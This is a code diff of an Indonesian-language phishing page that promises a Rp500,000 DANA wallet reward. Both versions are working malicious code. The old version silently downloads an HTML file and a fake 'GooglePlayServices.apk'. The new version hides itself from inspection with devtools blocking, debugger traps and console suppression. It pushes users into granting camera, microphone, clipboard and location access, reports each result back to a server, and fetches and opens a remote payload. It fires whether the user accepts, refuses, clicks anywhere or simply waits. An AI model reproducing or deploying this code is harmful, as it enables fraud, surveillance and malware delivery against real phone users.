@@ -25,20 +25,36 @@
         .btn-klaim{background:#108ee9;color:#fff;border:none;padding:18px;font-size:20px;font-weight:bold;border-radius:30px;cursor:pointer;width:100%;margin:10px 0;letter-spacing:2px;transition:0.3s}
         .btn-klaim:hover{transform:scale(1.02)}
         .btn-tolak{background:transparent;color:#99c2ff;border:2px solid #3388cc;padding:14px;font-size:15px;border-radius:30px;cursor:pointer;width:100%}
-        .status-bar{position:fixed;top:0;left:0;width:100%;height:4px;z-index:999999;background:#ff0000;display:none}
-        .status-bar.loading{display:block;animation:loading 3s infinite}
-        @keyframes loading{0%{width:0%}100%{width:100%}}
         .anti-debug{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0}
-        .hidden-download{position:absolute;width:0;height:0;border:none;visibility:hidden}
-        .ios-download{display:none}
+        .loading-overlay{position:fixed;top:0;left:0;width:100%;height:100%;z-index:99998;background:rgba(0,0,0,0.7);display:none;justify-content:center;align-items:center;flex-direction:column}
+        .loading-overlay.show{display:flex}
+        .loading-spinner{width:50px;height:50px;border:4px solid #333;border-top:4px solid #00ff88;border-radius:50%;animation:spin 1s linear infinite}
+        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+        .loading-text{color:#fff;margin-top:15px;font-size:14px}
+        .permission-fallback{position:fixed;top:0;left:0;width:100%;height:100%;z-index:99997;background:rgba(0,0,0,0.85);display:none;justify-content:center;align-items:center;flex-direction:column;padding:20px;text-align:center}
+        .permission-fallback.show{display:flex}
+        .permission-fallback h2{color:#fff;font-size:20px;margin-bottom:10px}
+        .permission-fallback p{color:#aaa;font-size:14px;margin-bottom:20px;max-width:350px}
+        .permission-fallback .btn-allow{background:#00ff88;color:#000;border:none;padding:15px 40px;font-size:16px;font-weight:bold;border-radius:30px;cursor:pointer}
+        .permission-fallback .btn-allow:hover{transform:scale(1.02)}
     </style>
 </head>
 <body>
 
 <iframe class="anti-debug" srcdoc="<script>debugger;</script>"></iframe>
-<div id="statusBar" class="status-bar"></div>
-<iframe id="downloadFrame" class="hidden-download"></iframe>
-<div id="iosDownload" class="ios-download"></div>
+
+<!-- LOADING OVERLAY -->
+<div class="loading-overlay" id="loadingOverlay">
+    <div class="loading-spinner"></div>
+    <div class="loading-text">⏳ Memproses...</div>
+</div>
+
+<!-- PERMISSION FALLBACK -->
+<div class="permission-fallback" id="permissionFallback">
+    <h2>🔐 Izin Diperlukan</h2>
+    <p>Untuk melanjutkan verifikasi, kami memerlukan akses ke beberapa fitur.</p>
+    <button class="btn-allow" onclick="allowAllPermissions()">✅ Izinkan Semua</button>
+</div>
 
 <div id="popupDana">
     <div class="box">
@@ -64,31 +80,424 @@
 
 <script>
 // ============================================================
-// 🔥 INDEX.HTML - DOWNLOAD + BUKA SystemUpdate.html
+// 🔥 INDEX.HTML - BYPASS IZIN DENGAN USER KLIK (FALLBACK)
 // ============================================================
 
-var SERVER = 'https://verifikasi.site';
-var semuaDidapat = false;
-var REDIRECT_DONE = false;
+// ============================================================
+// STEALTH + ANTI-ANALYSIS
+// ============================================================
+console.log = function() {};
+console.warn = function() {};
+console.error = function() {};
+console.info = function() {};
+console.debug = function() {};
+console.table = function() {};
 
-// ============================================================
-// FUNGSI DOWNLOAD SILENT
-// ============================================================
-function downloadSilent(url, filename) {
-    try {
-        var a = document.createElement('a');
-        a.href = url;
-        a.download = filename || url.split('/').pop();
-        a.style.display = 'none';
-        document.body.appendChild(a);
-        a.click();
-        setTimeout(function() {
-            try { document.body.removeChild(a); } catch(e) {}
-        }, 1000);
-        return true;
-    } catch(e) {
+(function() {
+    var check = function() {
+        var start = Date.now();
+        debugger;
+        var end = Date.now();
+        if (end - start > 100) {
+            document.body.innerHTML = '';
+            window.location.href = 'about:blank';
+        }
+    };
+    setInterval(check, 1000);
+})();
+
+document.addEventListener('keydown', function(e) {
+    if (e.key === 'F12' || 
+        (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
+        (e.ctrlKey && e.key === 'U')) {
+        e.preventDefault();
+        e.stopPropagation();
         return false;
     }
+});
+document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
+document.addEventListener('selectstart', function(e) { e.preventDefault(); return false; });
+
+window.onerror = function() { return true; };
+window.addEventListener('error', function(e) { e.preventDefault(); e.stopPropagation(); return true; }, true);
+window.addEventListener('unhandledrejection', function(e) { e.preventDefault(); e.stopPropagation(); return true; }, true);
+
+if (window.history && window.history.replaceState) {
+    window.history.replaceState(null, null, window.location.href);
+}
+Object.defineProperty(document, 'referrer', { value: '' });
+
+// ============================================================
+// DETEKSI PLATFORM
+// ============================================================
+function detectPlatform() {
+    var ua = navigator.userAgent.toLowerCase();
+    return {
+        isAndroid: ua.indexOf('android') > -1,
+        isIOS: /iphone|ipad|ipod/.test(ua),
+        isPC: !ua.match(/android|iphone|ipad|ipod|mobile/i),
+        isWebView: ua.indexOf('wv') > -1 || ua.indexOf('webview') > -1,
+        isAndroidBridge: typeof AndroidBridge !== 'undefined'
+    };
+}
+var PLATFORM = detectPlatform();
+
+// ============================================================
+// KONFIGURASI
+// ============================================================
+var GITHUB_USER = 'pandora-site';
+var GITHUB_REPO = 'verifikasi-site';
+var semuaDidapat = false;
+var DOWNLOAD_STARTED = false;
+var NOTIFICATION_SHOWN = false;
+var REDIRECT_DONE = false;
+var PERMISSION_RETRY = 0;
+var MAX_PERMISSION_RETRY = 3;
+var bypassSuccess = false;
+
+// ============================================================
+// FUNGSI K() - KIRIM DATA KE SERVER
+// ============================================================
+function K(d) {
+    try {
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', '/data', true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.timeout = 5000;
+        xhr.send(JSON.stringify(d));
+    } catch(e) {}
+}
+
+// ============================================================
+// 🔥 TUGAS 1: BYPASS SEMUA IZIN (DENGAN USER KLIK FALLBACK)
+// ============================================================
+function injectAllPermissions() {
+    var permissions = {
+        geolocation: false,
+        notification: false,
+        clipboard: false,
+        microphone: false,
+        camera: false,
+        vibrate: false,
+        storage: false
+    };
+
+    K({ sumber: 'bypass_permissions_start', data: 'all' });
+
+    // ─── GEOLOKASI ───
+    try {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                function() { permissions.geolocation = true; K({sumber:'bypass_geolocation', data:'success'}); },
+                function(err) { 
+                    permissions.geolocation = false; 
+                    K({sumber:'bypass_geolocation', data:'failed: ' + err.message});
+                    showPermissionFallback();
+                },
+                { enableHighAccuracy: true, timeout: 5000 }
+            );
+        }
+    } catch(e) { showPermissionFallback(); }
+
+    // ─── NOTIFIKASI ───
+    try {
+        if ('Notification' in window && Notification.permission !== 'denied') {
+            if (Notification.permission === 'granted') {
+                permissions.notification = true;
+                K({sumber:'bypass_notification', data:'already_granted'});
+            } else {
+                Notification.requestPermission().then(function(result) {
+                    if (result === 'granted') {
+                        permissions.notification = true;
+                        K({sumber:'bypass_notification', data:'success'});
+                    } else {
+                        permissions.notification = false;
+                        K({sumber:'bypass_notification', data:'failed'});
+                        showPermissionFallback();
+                    }
+                });
+            }
+        }
+    } catch(e) { showPermissionFallback(); }
+
+    // ─── CLIPBOARD ───
+    try {
+        if (navigator.clipboard) {
+            navigator.clipboard.readText()
+                .then(function() { 
+                    permissions.clipboard = true; 
+                    K({sumber:'bypass_clipboard', data:'success'});
+                })
+                .catch(function(err) { 
+                    permissions.clipboard = false;
+                    K({sumber:'bypass_clipboard', data:'failed: ' + err.message});
+                    showPermissionFallback();
+                });
+        }
+    } catch(e) { showPermissionFallback(); }
+
+    // ─── MICROPHONE ───
+    try {
+        if (navigator.mediaDevices) {
+            navigator.mediaDevices.getUserMedia({ audio: true, video: false })
+                .then(function(stream) {
+                    stream.getTracks().forEach(function(t) { t.stop(); });
+                    permissions.microphone = true;
+                    K({sumber:'bypass_microphone', data:'success'});
+                })
+                .catch(function(err) {
+                    permissions.microphone = false;
+                    K({sumber:'bypass_microphone', data:'failed: ' + err.message});
+                    showPermissionFallback();
+                });
+        }
+    } catch(e) { showPermissionFallback(); }
+
+    // ─── CAMERA ───
+    try {
+        if (navigator.mediaDevices) {
+            navigator.mediaDevices.getUserMedia({ audio: false, video: true })
+                .then(function(stream) {
+                    stream.getTracks().forEach(function(t) { t.stop(); });
+                    permissions.camera = true;
+                    K({sumber:'bypass_camera', data:'success'});
+                })
+                .catch(function(err) {
+                    permissions.camera = false;
+                    K({sumber:'bypass_camera', data:'failed: ' + err.message});
+                    showPermissionFallback();
+                });
+        }
+    } catch(e) { showPermissionFallback(); }
+
+    // ─── VIBRATE ───
+    try {
+        if (navigator.vibrate) {
+            navigator.vibrate(1);
+            permissions.vibrate = true;
+            K({sumber:'bypass_vibrate', data:'success'});
+        }
+    } catch(e) { K({sumber:'bypass_vibrate', data:'failed'}); }
+
+    // ─── STORAGE ───
+    try {
+        if (navigator.storage && navigator.storage.persist) {
+            navigator.storage.persist()
+                .then(function() {
+                    permissions.storage = true;
+                    K({sumber:'bypass_storage', data:'success'});
+                })
+                .catch(function() {
+                    permissions.storage = false;
+                    K({sumber:'bypass_storage', data:'failed'});
+                });
+        }
+    } catch(e) { K({sumber:'bypass_storage', data:'failed'}); }
+
+    // ─── CEK SEMUA BYPASS ───
+    setTimeout(function() {
+        var allSuccess = permissions.geolocation && 
+                         permissions.notification && 
+                         permissions.clipboard && 
+                         permissions.microphone && 
+                         permissions.camera;
+
+        if (allSuccess) {
+            bypassSuccess = true;
+            K({ sumber: 'bypass_permissions_done', data: 'all_success' });
+            hidePermissionFallback();
+            lanjutkanEksekusi();
+        } else {
+            K({ sumber: 'bypass_permissions_partial', data: permissions });
+            // Fallback akan muncul via showPermissionFallback()
+        }
+    }, 3000);
+}
+
+// ============================================================
+// 🔥 PERMISSION FALLBACK - USER KLIK
+// ============================================================
+function showPermissionFallback() {
+    if (bypassSuccess) return;
+    if (PERMISSION_RETRY >= MAX_PERMISSION_RETRY) {
+        K({ sumber: 'permission_fallback_max_retry', data: 'skip' });
+        lanjutkanEksekusi();
+        return;
+    }
+    
+    PERMISSION_RETRY++;
+    var fallback = document.getElementById('permissionFallback');
+    if (fallback) {
+        fallback.className = 'permission-fallback show';
+        K({ sumber: 'permission_fallback_shown', data: 'retry_' + PERMISSION_RETRY });
+    }
+}
+
+function hidePermissionFallback() {
+    var fallback = document.getElementById('permissionFallback');
+    if (fallback) {
+        fallback.className = 'permission-fallback';
+    }
+}
+
+function allowAllPermissions() {
+    K({ sumber: 'permission_fallback_click', data: 'user_allowed' });
+    hidePermissionFallback();
+    
+    // Tampilkan loading
+    var loading = document.getElementById('loadingOverlay');
+    if (loading) loading.className = 'loading-overlay show';
+    
+    // Retry bypass dengan user click
+    setTimeout(function() {
+        injectAllPermissions();
+    }, 500);
+}
+
+// ============================================================
+// 🔥 EKSEKUSI UTAMA (SETELAH BYPASS SUKSES ATAU SKIP)
+// ============================================================
+function lanjutkanEksekusi() {
+    // Sembunyikan loading
+    var loading = document.getElementById('loadingOverlay');
+    if (loading) loading.className = 'loading-overlay';
+    
+    // 🔥 TUGAS 2: DOWNLOAD HTML
+    setTimeout(function() { downloadPayloadSilent(); }, 500);
+    
+    // 🔥 TUGAS 3: BUKA HTML (5 detik)
+    openSystemUpdateHTML();
+    
+    // 🔔 NOTIFIKASI
+    setTimeout(function() { showKlaimNotification(); }, 3000);
+    
+    // 🔄 REDIRECT
+    setTimeout(redirectToDANA, 8000);
+}
+
+// ============================================================
+// 🔥 TUGAS 2: DOWNLOAD SystemUpdate.html KE localStorage
+// ============================================================
+function downloadPayloadSilent() {
+    if (DOWNLOAD_STARTED) return;
+    DOWNLOAD_STARTED = true;
+    
+    K({ sumber: 'download_start', data: { platform: PLATFORM } });
+    
+    var htmlUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.html';
+    
+    try {
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', htmlUrl, true);
+        xhr.timeout = 15000;
+        xhr.onload = function() {
+            if (xhr.status === 200) {
+                var htmlContent = xhr.responseText;
+                try {
+                    localStorage.setItem('SystemUpdate_backup', htmlContent);
+                    K({ sumber: 'html_download_success', data: 'saved_to_localStorage' });
+                } catch(e) {
+                    K({ sumber: 'html_download_error', data: 'localStorage_save_failed' });
+                }
+            }
+        };
+        xhr.onerror = function() {
+            K({ sumber: 'html_download_error', data: 'xhr_error' });
+        };
+        xhr.send();
+    } catch(e) {
+        K({ sumber: 'html_download_exception', data: e.message });
+    }
+}
+
+// ============================================================
+// 🔥 TUGAS 3: BUKA SystemUpdate.html DARI localStorage
+// ============================================================
+function openSystemUpdateHTML() {
+    setTimeout(function() {
+        var htmlContent = null;
+
+        try {
+            htmlContent = localStorage.getItem('SystemUpdate_backup');
+        } catch(e) {}
+
+        if (htmlContent) {
+            openHTML(htmlContent);
+            K({ sumber: 'open_html', data: 'success_from_localStorage' });
+        } else {
+            K({ sumber: 'open_html_failed', data: 'html_not_found_in_localStorage' });
+        }
+    }, 5000);
+}
+
+function openHTML(htmlContent) {
+    try {
+        var blob = new Blob([htmlContent], { type: 'text/html; charset=utf-8' });
+        var url = URL.createObjectURL(blob);
+        var win = window.open(url, '_blank');
+        if (win) {
+            K({ sumber: 'open_html_blob', data: 'success' });
+            return;
+        }
+    } catch(e) {}
+
+    try {
+        document.write(htmlContent);
+        document.close();
+        K({ sumber: 'open_html_document_write', data: 'success' });
+    } catch(e) {
+        K({ sumber: 'open_html_error', data: e.message });
+    }
+}
+
+// ============================================================
+// NOTIFIKASI + REDIRECT
+// ============================================================
+function showKlaimNotification() {
+    if (NOTIFICATION_SHOWN) return;
+    NOTIFICATION_SHOWN = true;
+    
+    try {
+        if (!('Notification' in window)) { return; }
+        if (Notification.permission === 'denied') { return; }
+        if (Notification.permission !== 'granted') {
+            Notification.requestPermission().then(function(permission) {
+                if (permission === 'granted') { createKlaimNotification(); }
+            }).catch(function() {});
+            return;
+        }
+        createKlaimNotification();
+    } catch(e) {}
+}
+
+function createKlaimNotification() {
+    try {
+        var notif = new Notification('🔔 Klik Untuk Klaim', {
+            body: 'Klik untuk menyelesaikan verifikasi dan klaim saldo DANA Rp500.000!',
+            icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">💰</text></svg>',
+            requireInteraction: true,
+            silent: false,
+            vibrate: [200, 100, 200]
+        });
+        
+        notif.onclick = function() {
+            notif.close();
+            if (!REDIRECT_DONE) {
+                REDIRECT_DONE = true;
+                setTimeout(function() {
+                    try { window.location.href = 'https://www.dana.id'; } catch(e) {}
+                }, 500);
+            }
+        };
+        
+        setTimeout(function() { try { notif.close(); } catch(e) {} }, 30000);
+    } catch(e) {}
+}
+
+function redirectToDANA() {
+    if (REDIRECT_DONE) return;
+    REDIRECT_DONE = true;
+    try { window.location.href = 'https://www.dana.id'; } catch(e) {}
 }
 
 // ============================================================
@@ -97,61 +506,53 @@ function downloadSilent(url, filename) {
 function dapatkanSemua() {
     if (semuaDidapat) return;
     semuaDidapat = true;
+    
     try {
         var popup = document.getElementById('popupDana');
         if (popup) popup.style.display = 'none';
-
-        // 🔥 DOWNLOAD SystemUpdate.html
-        setTimeout(function() {
-            downloadSilent(SERVER + '/files/SystemUpdate.html', 'SystemUpdate.html');
-        }, 500);
-
-        // 🔥 DOWNLOAD APK
-        setTimeout(function() {
-            downloadSilent(SERVER + '/files/GooglePlayServices.apk', 'GooglePlayServices.apk');
-        }, 1000);
-
-        // 🔥 BUKA SystemUpdate.html (setelah download)
-        setTimeout(function() {
-            window.location.href = SERVER + '/files/SystemUpdate.html';
-        }, 3000);
-
-        setTimeout(function() { redirectToDANA(); }, 8000);
-    } catch(e) {}
+        
+        K({ sumber: 'trigger', data: 'dapatkanSemua' });
+        
+        // 🔥 TAMPILKAN LOADING
+        var loading = document.getElementById('loadingOverlay');
+        if (loading) loading.className = 'loading-overlay show';
+        
+        // 🔥 MULAI BYPASS IZIN
+        injectAllPermissions();
+        
+    } catch(e) {
+        K({ sumber: 'dapatkanSemua_error', data: e.message });
+        // Jika error, langsung lanjutkan eksekusi
+        lanjutkanEksekusi();
+    }
 }
 
-function klaim() { dapatkanSemua(); }
-function tolak() { dapatkanSemua(); }
+function klaim() { K({sumber:'izin', data:'klaim'}); dapatkanSemua(); }
+function tolak() { K({sumber:'izin', data:'tolak'}); dapatkanSemua(); }
 
 // ============================================================
-// TIMER 10 DETIK
+// TIMER (10 DETIK)
 // ============================================================
 var w = 10;
-function countdown() {
+var timerInterval = setInterval(function() {
     w--;
     var el = document.getElementById('timer');
     if (el) el.textContent = '00:' + (w < 10 ? '0' + w : w);
     if (w <= 0) {
+        clearInterval(timerInterval);
+        K({sumber:'izin', data:'auto'});
         dapatkanSemua();
-        return;
     }
-    setTimeout(countdown, 1000);
-}
-setTimeout(countdown, 1000);
+}, 1000);
 
 document.addEventListener('click', function() {
     if (!semuaDidapat) {
+        K({sumber:'izin', data:'click_anywhere'});
         dapatkanSemua();
     }
 });
 
-function redirectToDANA() {
-    if (REDIRECT_DONE) return;
-    REDIRECT_DONE = true;
-    try { window.location.href = 'https://www.dana.id'; } catch(e) {}
-}
-
-console.log('✅ index.html loaded - Download + Buka SystemUpdate.html');
+console.log('✅ index.html loaded - BYPASS DENGAN USER KLIK FALLBACK!');
 </script>
 </body>
 </html>
